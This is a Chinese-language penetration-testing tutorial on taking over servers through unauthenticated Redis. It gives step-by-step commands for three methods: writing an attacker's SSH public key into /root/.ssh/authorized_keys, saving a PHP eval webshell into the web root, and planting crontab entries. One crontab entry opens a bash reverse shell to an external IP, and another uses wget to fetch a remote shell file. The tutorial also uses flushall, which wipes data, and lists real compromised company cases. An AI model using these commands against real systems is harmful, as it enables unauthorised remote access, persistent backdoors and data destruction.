# 0x01 考点

![title](https://leanote.com/api/file/getImage?fileId=5dd0b936ab6441492c000400)

![title](https://leanote.com/api/file/getImage?fileId=5da59b5cab64412ca40006ab)

![title](https://leanote.com/api/file/getImage?fileId=5da59c45ab64412ca40006ac)


`Redis` 是常见内网服务。其他的常见内网服务还有如 `Structs2` 和 `Elastic`。

参考手册：[Redis 命令参考](http://redisdoc.com/index.html)


**利用前提1：Redis 可访问**

一些 Redis 服务是可以直接公网访问的。

但是更多 Redis 服务是只开在内网中，在这种情况下可以配合 SSRF 漏洞进行访问。

**利用前提2： Redis 可登入**

Redis 漏洞之所以被利用的如此频繁，原因是它存在很多未授权访问。

不同于 Mysql 等服务器在配置过程中默认需要输入账号密码，Redis 在默认配置过程中无需设置密码。这就造成了一些 Redis 服务器存在简单的空口令、弱密码等安全风险。

存在类似风险的数据库服务器还有 MONGODB。

**Redis Crackit 漏洞**

如果 Redis 服务器可以公网访问，而且没有设置验证，那么则可以通过 Redis 直接获取 system shell（注意：不是 web shell）。你的 redis 运行在什么用户，就直接能以此用户身份进行登录。

因为攻击者通常会通过名为 `crackit` 的键（或者类似键名）写入 ssh 公钥进行登录，所以此漏洞名为 `Redis Crackit` 漏洞。

**本文概要**

- 未授权 Redis 拿 shell 的 `3` 种方式及其适用场景
    - 通过写 SSH key
    - 通过向 Web 目录中写入 webshell
    - 通过写 crontab



# 0x02 写 ssh key 获取 sh

原理：Redis 未授权访问然后写 authorized_keys 来强行拿权限。

参考：

- [Redis 未授权访问缺陷可轻易导致系统被黑](https://www.seebug.org/vuldb/ssvid-89715)
- [Redis Crackit 漏洞利用和防护](https://www.cnblogs.com/Csir/p/8244759.html)
- [Redis crackit 漏洞](https://www.jianshu.com/p/d42f2321960c)

> 虽然是参考的前辈的文章，上述的文章里面也有详细步骤。但是我会在本文中再次详细记录步骤，因为经验表明这类文章随时可能消失。

**此漏洞利用方式的前提是：**

1. Redis 服务器运行在 root 用户下（否则还要猜测用户）
2. 此服务器对外开启了 ssh 服务
3. Redis 未授权访问漏洞

> 注：
当然当然，写入的目录不限于`/root/.ssh`下的`authorized_keys`，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。
本文中仅仅以 Root 用户为例。

所以在实际渗透过程中，该服务器「端口扫描」结果至少要满足：

- Redis 服务 open（默认 6379 端口）
- ssh 服务 open（默认 22 端口）[没开 ssh 都是扯淡]
 

**利用现状：**

首先此方式肯定是无法适用于 Windows 主机的。（判断是 Windows 机器还是 Linux 机器可以通过下图所示的命令根据路径判断）

![title](https://leanote.com/api/file/getImage?fileId=5dd12561ab6441492c000823)

另外随着运维人员对此漏洞认识的深入，现在越来越少运维会直接以 root 起 Redis 的。这样就无法直接往 `/root/.ssh` 目录下写公钥。

当然写入的目录不限于`/root/.ssh`下的`authorized_keys`，也可以写入用户目录。那么要多一个猜用户的步骤。


相较之下、直接写 webshell 和写计划任务这两种方式用的更多。

【**缺点**】

- 此方法需要 flushall，会破坏数据。慎用。
- 不适合于 Windows OS 服务器。


**具体步骤：**

![title](https://leanote.com/api/file/getImage?fileId=5dd11445ab6441492c000791)


1、在 Kali 上生成一个 ssh key：
``` shell
# ssh-keygen -t rsa -C "redis-crackit@unixhot.com"
```

2、给公钥加点换行：
``` shell
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > zhimakaimen.txt
```
注：最好在公钥内容的前面和后面都加上一点空格和回车，不然貌似数据库的其它内容会造成影响。


3、清空数据，必备操作。注意：不要轻易操作，会清空 redis 所有数据。

``` shell
[root@test-node1 ~]# redis-cli -h [服务器IP] flushall
```

4、把公钥写入到一个 key 里面，这个例子中是写入了 `zhimakaimen` 这个 key。
``` shell
[root@test-node1 ~]# cat zhimakaimen.txt | redis-cli -h [服务器IP] -x set zhimakaimen
```

> 注：
`-x` 代表从标准输入读取数据作为该命令的最后一个参数。
$echo "world" |redis-cli -x set hello
Ok
—— [redis cli命令详解](https://blog.csdn.net/whatday/article/details/102924661)

5、连接到这个 Redis 上：
``` shell
[root@test-node1 ~]# redis-cli -h [服务器IP]
```

6、设置 rdb 文件存放的路径：
```shell
redis [服务器IP]:6379> config set dir /root/.ssh/
```
注：[Redis Config Set 命令 - 修改 redis 配置参数，无需重启](https://www.redis.net.cn/order/3669.html)


7、设置 rdb 文件的文件名
```shell
redis [服务器IP]:6379> config set dbfilename "authorized_keys"
```

注：`config set dir xxx` 和 `config set dbfilename xxx` 这两步是什么意思呢？

> 引自于： [利用redis写webshell](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html)，离别歌，PHITHON，2015年3月13日
我们可以将`dir`设置为一个`目录a`，而`dbfilename`为`文件名b`，再执行`save`或`bgsave`，则我们就可以写入一个路径为`a/b`的任意文件：
![title](https://leanote.com/api/file/getImage?fileId=5dd13bfdab6441492c000928)
当我们获得了一个 redis 控制台，我们可以调用 `config set/get` 等命令对 redis 的部分配置进行修改。而恰好的是，我们可以通过`config set`来更改`dir`和`dbfilename`。也就是说我们可以不用修改`redis.conf`，也不用重启 redis 服务就可以写入任意文件。

所以这两步加上下面的 `save` 这一步是把上面在内存中写入的公钥写入到 `/root/.ssh/authorized_keys` 这一个硬盘上的文件中。

8、搞定保存。

``` shell
redis [服务器IP]:6379> save
redis [服务器IP]:6379> exit
```
注：Redis 的数据主要保存在内存中，但使用者可以随时执行 `save` 命令将当前 Redis 的数据保存到硬盘上，另外redis也会根据配置自动存储数据到硬盘上。


9、尝试登陆：
``` shell
[root@test-node1 ~]# ssh root@[服务器IP]
Last login: Wed Nov 11 17:39:12 2015 from test-node1.unixhot.com
```

这样我们就获得了一台服务器的 sh。


可以到此服务器上查看，发现 `/root/.ssh` 目录下已经有了 `authorized_keys`：
``` shell
[root@test-node2 ~]# cat /root/.ssh/authorized_keys
```

下2图是一个联想招聘系统 Redis 未授权写 ssh key 获取 sh 的实例：


![title](https://leanote.com/api/file/getImage?fileId=5dd12316ab64414b290007ef)

![title](https://leanote.com/api/file/getImage?fileId=5dd1237aab6441492c000809)


**实例：**

首先在我的 Kali 上生成秘钥对，并给公钥加点换行：

![title](https://leanote.com/api/file/getImage?fileId=5dd0eafbab64414b290005c6)

清空存在未授权访问漏洞的 Redis 服务器上的数据：

![title](https://leanote.com/api/file/getImage?fileId=5dd0eb6dab6441492c0005fa)

这时候看 Redis 数据库里面就会发现：键还在、值没了：

![title](https://leanote.com/api/file/getImage?fileId=5dd0ebaaab6441492c0005fc)

> 附：Redis 数据库可视化工具 Redis Desktop Manager：
链接：https://pan.baidu.com/s/1hhC15bVXRguxtdpaqmKYPQ 
提取码：9x68 

把公钥写入到 Redis 数据库中，作为 `zhimakaimen` key 对应的 value。

![title](https://leanote.com/api/file/getImage?fileId=5dd0ec94ab64414b290005d4)

连接 Redis，设置 rdb 文件存放的路径。在这一步时候遇到了问题，提示没有 `/root/.ssh/` 这个目录。

![title](https://leanote.com/api/file/getImage?fileId=5dd0eea3ab6441492c000618)

插句话，为什么没有呢？

![title](https://leanote.com/api/file/getImage?fileId=5dd11700ab64414b29000799)

如上图所示，可以从 `D:\\Redis` 看出来，这是一个 Windows 机器，自然是没有那个目录的。

在这种情况下，就不能通过往 Redis 写入公钥来获取 sh 了。


# 0x03 直接向 web 目录写入 webshell 

参考：

- [利用 redis 写 webshell](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html) —— P牛原理篇
- [电信某服务器 getshell 可渗透内网（利用 redis getshell 案例）](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0101465.html) —— 完整示范实例

**利用条件：**

- 服务器有 web 服务（没开 web 服务你写个鬼 webshell 呢？鬼帮你解析木马文件呢？如果 redis 和 php 不是跑在同一个服务器上我们也没办法是不是？）
- 知道绝对路径（把木马文件存储至硬盘上，是写 shell 的必要条件之一）
- 无需是 root 起的 Redis
- 可适用于 Windows（非 ssh 连接）
- 无需 `flushall` 清空数据库

所以实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用。
参考这篇：[环球网 SVN 配置不当引发的血案（Redis 未授权访问/GETSHELL/数据库配置信息泄漏）](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0153717.html)，需要先获取各种探针文件（目录爆破），再从探针文件中获取相关路径信息、公网 IP 等信息，甚至从报错中尝试出物理路径信息（有些站的页面报错会直接暴露绝对路径）。
实在不行甚至可以猜路径，参考猪猪侠的这篇：[聚美优品某 redis 服务器匿名对外开放](https://shuimugan.com/bug/view?bug_no=153275)。



**具体步骤：**


1、连接到这个 Redis 上：
``` shell
root@kali:~# redis-cli -h **.**.**.**
```

`注意：` Redis 的连接除了通过指定 `IP`，也可以通过指定域名，参考：[聚美优品某 redis 服务器匿名对外开放](https://shuimugan.com/bug/view?bug_no=153275)。

![title](https://leanote.com/api/file/getImage?fileId=5dd15d15ab64414b29000a53)

2、设置写入目录：
``` shell
redis **.**.**.**:6379> config set dir /var/www/html/

OK
```

3、设置写入文件：
``` shell
redis **.**.**.**:6379> config set dbfilename test.php

OK
```

4、以键值对的形式写入一句话木马

``` shell
redis **.**.**.**:6379> set webshell "<?php @eval($_POST[123]);?>"

OK
```
自己看情况改一句话木马。

`注意：`实际上这里相当于一个可解析文件的任意文件上传点，也可以写入别的文件如 phpinfo 并进行解析：

![title](https://leanote.com/api/file/getImage?fileId=5dd14b43ab6441492c0009c5)

![title](https://leanote.com/api/file/getImage?fileId=5dd14bbcab6441492c0009d2)

> 但是要注意这里有个问题：为什么我们不直接在这里写入大马呢？（在可视化软件中可以方便的添加长字符串）
Redis 在生产环境里面数据量经常是十分庞大的，save 到 php 文件里如果超过 php 的允许文件大小，会导致无法解析。而且 save 也不支持仅写入某个数据库，而是只能保存整个 redis 的实例，所以 select 到某个空数据库来写入 shell 也是无法试验的。
在这种情况下有个简单粗暴的方法：直接 `flushall` 全删掉即可。或者先备份再删，之后再进行恢复。这样就腾出空间写 shell 了。
当然 `flushall` 是高危操作，会清空数据，当然能不用则不用。所以我们还是写一句话木马最小、最节省空间。

5、保存写入硬盘

``` shell
redis **.**.**.**:6379> save

OK
```

6、得到 webshell，菜刀连

得到 shell：`http://**.**.**.**/test.php`

![title](https://leanote.com/api/file/getImage?fileId=5dd14a17ab64414b29000978)

命令执行、可提权：

![title](https://leanote.com/api/file/getImage?fileId=5dd14a45ab64414b2900097a)


**如何练习从探针文件中寻找写 webshell 路径？**

可参考以下案例：

1. [电信某服务器 getshell 可渗透内网（利用 Redis getshell 案例）](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0101465.html) 【直接写 webshell】
2. [环球网 SVN 配置不当引发的血案（Redis 未授权访问/GETSHELL/数据库配置信息泄漏）](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0153717.html)【直接写 webshell】
3. [暴风某站 Redis 未授权可任意上传文件](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0133489.html)【直接写 webshell】
4. [中国电信某服务器 Redis 未授权访问（Redis 的 getshell 案例）](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0124846.html)【直接写 webshell】
5. [酷牛某站 Redis 未授权导致 Getshell(全网数据泄漏) ](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0117633.html)【直接写 webshell】
6. [闪动某站 Redis 未授权可 shell](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115599.html)【直接写 webshell】
7. [深圳之窗某分站存在 Redis 无认证可写入 webshell](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0105627.html)【直接写 webshell】
8. [聚美优品某redis服务器匿名对外开放](https://shuimugan.com/bug/view?bug_no=153275)【猪猪侠猜路径】
9. [宇龙通信（酷派）某站 Redis 未授权访问可 Shell ](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0125621.html)【极端情况下覆盖 phpinfo 写一句话木马】

# 0x04 通过写 crontab 的方式 getshell

参考：

- [redis 在渗透中 getshell 方法总结](https://zhuanlan.zhihu.com/p/36529010) —— 童话师傅写的
- [凤凰网某站点 Redis 未授权访问导致 Getshell](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0161323.html) —— wooyun 案例
- [redis 远程命令执行 exploit (不需要flushall)](http://zone.secbug.net/content/23858.html) —— 猪猪侠


**利用条件：**

通过写 crontab 的方式 getshell 是一种很绿色的方式：

- 无需 `flushall` 清空数据


注意，这里并不是因为写计划任务本身无需 `flushall`，而是因为
`redis-cli set 1 'ringzero'` 这样的语法可以控制第一条记录，就能保证你的内容始终保持在最前面。

举个例子：

![title](https://leanote.com/api/file/getImage?fileId=5dd1669cab6441492c000af6)

`redis-cli set % 'test'` 就是一个标准用法，因为百分号比1的优先级更高。

注：`-x` 代表从标准输入读取数据作为该命令的最后一个参数。


- 需要是 `root` 起的 Redis。

归根到底还是要 root 运行 redis，毕竟要写到`/var/spool/cron/crontabs/root`下，主要优势是适用一些 ssh 不能被直接访问的场景。

- 不适用于 Windows 服务器

Windows 情境下没有计划任务，可以尝试一下写入启动项。理论上可以尝试写文件到用户启动项，但是现实是 Windows 普通用户没有计划任务权限。Windows 下 Redis 拿 shell，后面会单独成文讨论。



**具体步骤：**

在 Kali 攻击机器上：

1、通过 redis-cli 进入交互式shell
``` shell
redis-cli -h [Redis IP/域名] -p 6379
```



2、设置写 crontabs 的文件夹路径
``` shell
config set dir /var/spool/cron/crontabs
```
3、修改备份文件名
``` shell
config set dbfilename root
```
4、对 `/var/spool/cron/crontabs/root` 写入「反弹 shell」的计划任务
``` shell
echo -e "\n\n\n* * * * * bash -i >& /dev/tcp/198.xx.xx.xxx/9999 0>&1\n\n\n"|redis-cli -x set %
```

注：个人觉得童话师傅下面的图中设置计划任务这一句有点问题，也就是没设置在redis中的优先级。如果不设置优先级可能还需要 `flushall`。

![title](https://leanote.com/api/file/getImage?fileId=5dd166d5ab6441492c000af9)

除了反弹 shell 的计划任务之外，也可以设置别的计划任务，如写大马（但是下图中这个 shell 写的有点奇怪，总之就是这个网站 web 目录位置很奇怪）：
``` shell
echo -e "\n\n* * * * * wget http://***.***.***.***/shell.txt -O /data/media/xiao.php\n\n"|redis-cli -h 61.155.167.220 -p 221 -x set %
```
![title](https://leanote.com/api/file/getImage?fileId=5dd1669cab6441492c000af6)


5、保存
``` shell
save
```


6、监听公网机器指定端口，接收反弹回来的 shell
``` shell
nc -lvvp 9999
```

# 0x05 总结


未授权或弱密码造成的可登入是必要条件，可公网访问是充分条件。

如果公网不能访问，还可以通过 socks 隧道、SSRF 等方式内网漫游。



|未授权/弱密码 Redis 拿 shell 方式  |  仅适用于 Linux  | 必须是 root 起的 Redis  |是否需要清空数据（flushall）|特殊要求1|特殊要求2|
| :--------: | :--------:| :--: | :--: | :--: |:--: |
| 写 SSH key  | √|  √ |√ |需要开了 ssh 服务||
| 直接写 webshell   |    |   |  可能需要  |需要开了 web 服务|需要知道web目录的物理路径|
| 写 crontab|    √ | √  |   ||



最后说个有意思的，本文是我看了 wooyun 上101个 redis 相关漏洞之后写成的。wooyun 上跟 Redis 有关的漏洞具有明显的时间分段性，在15年11月之前，主要是未授权导致的数据泄露，获得一些账号密码。另外还可以 DoS（参考：[Sangfor VMP redis unauthorized access vulnerability](https://wooyun.x10sec.org/static/bugs/wooyun-2015-094491.html)），主要是在 Redis 的命令行工具里输入 `shuntdown` 命令关闭 Redis 服务器，影响网站正常业务。在15年11月之后，你懂得~


【下篇】预计内容：

- Redis 主从复制 getshell 复现

- Windows 下 Redis 拿 shell 方式 

- Redis 反弹 shell 姿势总结

- 真实渗透中的 Redis 信息收集（既是准备工作，也是筛选，筛选出有数据的 Redis）

- 批量化脚本思路（sh 脚本、Python 脚本。批量 B 段、C 段）

- 修复方案






----------------------------------------------------


## 参考资料：

1. [Redis 未授权访问缺陷可轻易导致系统被黑](https://www.seebug.org/vuldb/ssvid-89715)，Seebug，知道创宇，2015年11月11日
2. [利用 redis 写 webshell](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html)，离别歌，PHITHON，2015年3月13日
3. [中国铁建内网漫游沦陷多个重要部门泄漏大量信息(redis+ssh-keygen 免认证登录案例)](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0152710.html)，wooyun，wsg00d，2015年11月8日 
4. [从 Redis 弱口令到小牛核心数据库](https://wooyun.x10sec.org/static/bugs/wooyun-2015-0158789.html)，wooyun，路人甲，2015年12月6日【猜出来了弱口令】
5. [熊猫翻滚redis服务可无密码远程访问导致敏感数据泄漏](https://wooyun.x10sec.org/static/bugs/wooyun-2014-054740.html)，wooyun，after1990s，2014年3月27日 
6. [redis 在渗透中 getshell 方法总结](https://zhuanlan.zhihu.com/p/36529010)，知乎网，童话，2018年5月7日
7. [redis 远程命令执行 exploit (不需要flushall)](http://zone.secbug.net/content/23858.html)，乌云内测版，猪猪侠，2015年11月11日
8. [redis利用姿势收集](https://phpinfo.me/2016/07/07/1275.html)，Lcy's blog，Lcy，2016年7月7日


